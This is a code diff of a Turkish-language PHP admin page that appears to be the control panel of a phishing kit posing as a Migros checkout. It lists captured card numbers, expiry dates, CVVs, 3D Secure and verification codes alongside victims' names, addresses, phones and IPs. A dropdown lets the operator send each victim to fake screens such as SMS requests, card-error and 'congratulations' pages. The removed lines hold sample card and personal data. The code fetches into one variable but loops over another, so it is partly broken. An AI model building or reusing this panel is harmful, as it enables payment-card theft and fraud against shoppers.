@@ -1,3 +1,10 @@
+<?php
+$sql = "SELECT * FROM siparisler";
+
+$stmt = $pdo->prepare($sql);
+$stmt->execute();
+$siparisler = $stmt->fetchAll(PDO::FETCH_ASSOC);
+?>
 <div class="content-wrapper">
     <div class="container-fluid">
       <!-- Breadcrumb-->
@@ -51,18 +58,20 @@
                     </tr>
                 </thead>
                 <tbody>
+                <?php
+                            foreach ($urunler as $urun) {?>
                     <tr>
-                        <td>1</td>
-                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal">Göster</button></td>
-                        <td>4543 6047 8787 9898</td>
-                        <td>07/25</td>
-                        <td>784</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal">Göster</button></td>
-                        <td style="color: green">787887</td>
-                        <td style="color: green">545454</td>
-                        <td>23/12/2023 12:53:05</td>
-                        <td>10500 ₺</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal">Göster</button></td>
+                        <td><?=$urun['id']?></td>
+                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal<?=$urun['id']?>">Göster</button></td>
+                        <td><?=$urun['kart_no']?></td>
+                        <td><?=$urun['skt_no']?></td>
+                        <td><?=$urun['cvv_no']?></td>
+                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal<?=$urun['id']?>">Göster</button></td>
+                        <td style="color: green"><?=$urun['3d_kodu']?></td>
+                        <td style="color: green"><?=$urun['dogrulama']?></td>
+                        <td><?=$urun['tarih']?></td>
+                        <td><?=$urun['tutar']?> ₺</td>
+                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal<?=$urun['id']?>">Göster</button></td>
                         <td>
                               <select class="form-control" id="select-area" data-id="1">
                                     <option>Seç</option>
@@ -85,142 +94,7 @@
                         <td style="color: green">İşlemi Bitirdi</td>
 
                     </tr>
-                    <tr>
-                        <td>1</td>
-                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal">Göster</button></td>
-                        <td>4543 6047 8787 9898</td>
-                        <td>07/25</td>
-                        <td>784</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal">Göster</button></td>
-                        <td style="color: green">787887</td>
-                        <td style="color: green">545454</td>
-                        <td>23/12/2023 12:53:05</td>
-                        <td>10500 ₺</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal">Göster</button></td>
-                        <td>
-                              <select class="form-control" id="select-area" data-id="1">
-                                    <option>Seç</option>
-                                    <option value="ban">Banla</option>
-                                    <option value="delete">Logu sil</option>
-                                    <option value="3dsecure">SMS Gönder</option>
-                                    <option value="tebrik">Tebrikle</option>
-                                    <option value="hatali">Hatalıya Gönder</option>
-                                    <option value="dogrulama">Dogrulama</option>
-                                    <option value="ccno_error">CCNO Hatalı</option>
-                                    <option value="skt_error">SKT Hatalı</option>
-                                    <option value="cvv_error">CVV Hatalı</option>
-                                    <option value="bekle">Bekle</option>
-                                    <option value="closed_card">Kart Kapalı</option>
-                                    <option value="red_card">Hata Ver</option>
-                                    <option value="phone_error">Telefon Hatalı</option>
-                                </select>
-                   
-                        </td>
-                        <td style="color: green">İşlemi Bitirdi</td>
-
-                    </tr>
-                    <tr>
-                        <td>1</td>
-                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal">Göster</button></td>
-                        <td>4543 6047 8787 9898</td>
-                        <td>07/25</td>
-                        <td>784</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal">Göster</button></td>
-                        <td style="color: green">787887</td>
-                        <td style="color: green">545454</td>
-                        <td>23/12/2023 12:53:05</td>
-                        <td>10500 ₺</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal">Göster</button></td>
-                        <td>
-                              <select class="form-control" id="select-area" data-id="1">
-                                    <option>Seç</option>
-                                    <option value="ban">Banla</option>
-                                    <option value="delete">Logu sil</option>
-                                    <option value="3dsecure">SMS Gönder</option>
-                                    <option value="tebrik">Tebrikle</option>
-                                    <option value="hatali">Hatalıya Gönder</option>
-                                    <option value="dogrulama">Dogrulama</option>
-                                    <option value="ccno_error">CCNO Hatalı</option>
-                                    <option value="skt_error">SKT Hatalı</option>
-                                    <option value="cvv_error">CVV Hatalı</option>
-                                    <option value="bekle">Bekle</option>
-                                    <option value="closed_card">Kart Kapalı</option>
-                                    <option value="red_card">Hata Ver</option>
-                                    <option value="phone_error">Telefon Hatalı</option>
-                                </select>
-                   
-                        </td>
-                        <td style="color: green">İşlemi Bitirdi</td>
-
-                    </tr>
-                    <tr>
-                        <td>1</td>
-                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal">Göster</button></td>
-                        <td>4543 6047 8787 9898</td>
-                        <td>07/25</td>
-                        <td>784</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal">Göster</button></td>
-                        <td style="color: green">787887</td>
-                        <td style="color: green">545454</td>
-                        <td>23/12/2023 12:53:05</td>
-                        <td>10500 ₺</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal">Göster</button></td>
-                        <td>
-                              <select class="form-control" id="select-area" data-id="1">
-                                    <option>Seç</option>
-                                    <option value="ban">Banla</option>
-                                    <option value="delete">Logu sil</option>
-                                    <option value="3dsecure">SMS Gönder</option>
-                                    <option value="tebrik">Tebrikle</option>
-                                    <option value="hatali">Hatalıya Gönder</option>
-                                    <option value="dogrulama">Dogrulama</option>
-                                    <option value="ccno_error">CCNO Hatalı</option>
-                                    <option value="skt_error">SKT Hatalı</option>
-                                    <option value="cvv_error">CVV Hatalı</option>
-                                    <option value="bekle">Bekle</option>
-                                    <option value="closed_card">Kart Kapalı</option>
-                                    <option value="red_card">Hata Ver</option>
-                                    <option value="phone_error">Telefon Hatalı</option>
-                                </select>
-                   
-                        </td>
-                        <td style="color: green">İşlemi Bitirdi</td>
-
-                    </tr>
-                    <tr>
-                        <td>1</td>
-                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal">Göster</button></td>
-                        <td>4543 6047 8787 9898</td>
-                        <td>07/25</td>
-                        <td>784</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal">Göster</button></td>
-                        <td style="color: green">787887</td>
-                        <td style="color: green">545454</td>
-                        <td>23/12/2023 12:53:05</td>
-                        <td>10500 ₺</td>
-                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal">Göster</button></td>
-                        <td>
-                              <select class="form-control" id="select-area" data-id="1">
-                                    <option>Seç</option>
-                                    <option value="ban">Banla</option>
-                                    <option value="delete">Logu sil</option>
-                                    <option value="3dsecure">SMS Gönder</option>
-                                    <option value="tebrik">Tebrikle</option>
-                                    <option value="hatali">Hatalıya Gönder</option>
-                                    <option value="dogrulama">Dogrulama</option>
-                                    <option value="ccno_error">CCNO Hatalı</option>
-                                    <option value="skt_error">SKT Hatalı</option>
-                                    <option value="cvv_error">CVV Hatalı</option>
-                                    <option value="bekle">Bekle</option>
-                                    <option value="closed_card">Kart Kapalı</option>
-                                    <option value="red_card">Hata Ver</option>
-                                    <option value="phone_error">Telefon Hatalı</option>
-                                </select>
-                   
-                        </td>
-                        <td style="color: green">İşlemi Bitirdi</td>
-
-                    </tr>
+                    <?php }?>
                 </tbody>
                 <tfoot>
                     <tr>
@@ -240,7 +114,9 @@
                     </tr>
                 </tfoot>
             </table>
-            <div class="modal fade" id="smallsizemodal" style="display: none;" aria-hidden="true">
+            <?php
+                            foreach ($urunler as $urun) {?>
+            <div class="modal fade" id="smallsizemodal<?=$urun['id']?>" style="display: none;" aria-hidden="true">
                   <div class="modal-dialog modal-lg">
                     <div class="modal-content">
                       <div class="modal-header">
@@ -274,17 +150,17 @@
                                     </thead>
                                     <tbody>
                                     <tr>
-                                        <td>Ahmet Yılmaz</td>
-                                        <td>İstanbul</td>
-                                        <td>Beşiktaş</td>
-                                        <td>Moda</td>
-                                        <td>1</td>
-                                        <td>1</td>
-                                        <td>1</td>
-                                        <td>Yok</td>
-                                        <td>Ev</td>
-                                        <td>+905324847878</td>
-                                        <td>88.252.74.17</td>
+                                        <td><?=$urun['adi']?> <?=$urun['soyadi']?></td>
+                                        <td><?=$urun['il']?></td>
+                                        <td><?=$urun['ilce']?></td>
+                                        <td><?=$urun['mahalle']?></td>
+                                        <td><?=$urun['bina_no']?></td>
+                                        <td><?=$urun['kat_no']?></td>
+                                        <td><?=$urun['daire_no']?></td>
+                                        <td><?=$urun['adres_tarifi']?></td>
+                                        <td><?=$urun['adres_ismi']?></td>
+                                        <td><?=$urun['telefon']?></td>
+                                        <td><?=$urun['ip']?></td>
                                     </tr>
                                     </tbody>
                                 </table>
@@ -301,7 +177,10 @@
                     </div>
                   </div>
             </div>
-            <div class="modal fade" id="smalllsizemodal" style="display: none;" aria-hidden="true">
+            <?php }?>
+            <?php
+                            foreach ($urunler as $urun) {?>
+            <div class="modal fade" id="smalllsizemodal<?=$urun['id']?>" style="display: none;" aria-hidden="true">
                   <div class="modal-dialog modal-lg">
                     <div class="modal-content">
                       <div class="modal-header">
@@ -327,9 +206,10 @@
                                     </thead>
                                     <tbody>
                                     <tr>
-                                        <td>İş Bankası</td>
-                                        <td>+902124545454</td>
-                                        <td>VISA</td>
+                                        
+                                        <td><?=$urun['banka_adi']?></td>
+                                        <td><?=$urun['banka_no']?></td>
+                                        <td><?=$urun['kart_tipi']?></td>
                                     </tr>
                                     </tbody>
                                 </table>
@@ -345,7 +225,10 @@
                     </div>
                   </div>
             </div>
-            <div class="modal fade" id="smallllsizemodal" style="display: none;" aria-hidden="true">
+            <?php }?>
+            <?php
+                            foreach ($urunler as $urun) {?>
+            <div class="modal fade" id="smallllsizemodal<?=$urun['id']?>" style="display: none;" aria-hidden="true">
                   <div class="modal-dialog">
                     <div class="modal-content border-0">
                         <div class="card mb-0">
@@ -356,14 +239,9 @@
                                 <li data-target="#carousel-2" data-slide-to="2" class=""></li>
                               </ol>
                               <div class="carousel-inner">
+                                
                                 <div class="carousel-item active">
                                   <img class="d-block w-100 card-img-top" style="max-height: 400px" src="https://images.migrosone.com/elektronik/product/39401915/39401915-4af3e9-1650x1650.png" alt="Card image cap">
-                                </div>
-                                <div class="carousel-item">
-                                  <img class="d-block w-100 card-img-top" style="max-height: 400px" src="https://images.migrosone.com/elektronik/product/39184344/39184344-0fc37c-1650x1650.jpg" alt="Card image cap">
-                                </div>
-                                <div class="carousel-item">
-                                  <img class="d-block w-100 card-img-top" style="max-height: 400px" src="https://images.migrosone.com/elektronik/product/39398277/39398277-4d4367-1650x1650.jpg" alt="Card image cap">
                                 </div>
                               </div>
                               <a class="carousel-control-prev" href="#carousel-2" role="button" data-slide="prev">
@@ -381,14 +259,13 @@
                             </div>
                              <ul class="list-group list-group-flush list shadow-none">
                               <li class="list-group-item d-flex justify-content-between align-items-center"> Toshiba 50UL3C63DT/2 126 Ekran UHD Uydu Smart Led Tv  <span class="badge badge-light">1</span></li>
-                              <li class="list-group-item d-flex justify-content-between align-items-center"> Samsung Watch6 Sm-r940nzsatur Silver (44Mm)  <span class="badge badge-success">1</span></li>
-                              <li class="list-group-item d-flex justify-content-between align-items-center"> Rampage Kb-r22 Letho Multımedıa Raınbow Gaming Klavye <span class="badge badge-danger">1</span></li>
                             </ul>
                           </div>
                       
                     </div>
                   </div>
             </div>
+            <?php }?>
             </div>
             </div>
           </div>
